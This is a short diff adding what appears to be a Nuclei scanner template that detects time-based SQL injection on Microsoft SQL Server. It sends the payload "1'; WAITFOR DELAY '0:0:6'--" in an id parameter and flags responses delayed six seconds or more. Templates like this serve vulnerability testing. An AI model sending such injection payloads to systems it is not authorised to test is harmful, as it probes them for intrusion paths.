@@ -1,0 +1,12 @@
+id: K70n0s510-sqli-time-mssql
+info:
+  name: MSSQL Time-Based SQLi
+  author: K70n0s510
+  severity: critical
+  tags: sqli,mssql
+http:
+  - method: GET
+    path: ["{{BaseURL}}/?id=1'; WAITFOR DELAY '0:0:6'--"]
+    matchers:
+      - type: dsl
+        dsl: ["duration>=6"]
